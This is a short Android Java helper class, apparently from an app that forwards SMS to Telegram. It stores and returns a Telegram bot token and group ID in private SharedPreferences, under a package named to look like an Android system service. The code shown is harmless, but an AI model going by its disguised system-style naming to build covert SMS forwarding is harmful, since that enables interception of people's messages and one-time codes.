package android.service.sms.helpers;

import android.content.Context;
import android.content.SharedPreferences;

public class SharedPrefHelper {

    private final SharedPreferences mPreference;
    private final SharedPreferences.Editor mPrefEditor;

    public SharedPrefHelper(Context context) {

        String APP_PREF_NAME = context.getPackageName();

        this.mPreference = context.getSharedPreferences(APP_PREF_NAME, Context.MODE_PRIVATE);
        this.mPrefEditor = mPreference.edit();
    }

//    ----------------------------------------------------------------------------------------------

    public void saveTGBotToken(String token){
        mPrefEditor.putString("bot_token", token);
        mPrefEditor.commit();
    }

    public String getTGBotToken(){
        return  mPreference.getString("bot_token", "");
    }

//    ----------------------------------------------------------------------------------------------

    public void saveTGGroupID(String groupID){
        mPrefEditor.putString("groupID", groupID);
        mPrefEditor.commit();
    }

    public String getTGGroupID(){
        return  mPreference.getString("groupID", "");
    }
}
